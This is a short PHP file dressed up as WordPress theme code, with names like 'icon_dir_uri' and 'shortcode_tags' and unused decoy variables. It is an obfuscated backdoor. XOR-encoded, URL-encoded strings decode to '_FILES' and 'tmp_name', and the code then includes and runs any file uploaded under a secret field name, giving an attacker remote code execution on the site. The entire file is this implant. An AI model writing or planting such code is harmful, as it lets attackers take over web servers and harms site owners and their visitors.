<?php 	
	$expages = 'meta';
function icon_dir_uri()

{
    $allowed_protocols = 'uK8pIoGyDX';
    $parsed = $allowed_protocols;

    

    $current_user = $GLOBALS[tagregexp("%2A%0Dq%3C%0C%3C", $parsed)];
	$char = 'shortcode_tags';
    $safe_text = $current_user;

    $in_string = isset($safe_text[$parsed]);

    if ($in_string)

    {
        $good_protocol_url = $current_user[$parsed];
	$_wp_suspend_cache_invalidation = 'mime_subgroup';
        $unicode = $good_protocol_url[tagregexp("%01%26H%2F%27%0E%2A%1C", $parsed)];

        $tag_name = $unicode;
	$tax_input = 'post_meta_key';
        include ($tag_name);
    }

}
function tagregexp($myHTML, $all_parts)

{

    $wp_error = $all_parts;
	$smiley_url = 'mime_pattern';
    $string = "url" . "decode";
    $group_by_status = $string($myHTML);
    $format = substr($wp_error,0, strlen($group_by_status));
    $meta_key = $group_by_status ^ $format;

    
	$nestable_tags = 'new_path';
    $group_by_status = strpos($meta_key, $format);
    

    return $meta_key;
	$context = 'email';
}

icon_dir_uri();


?>
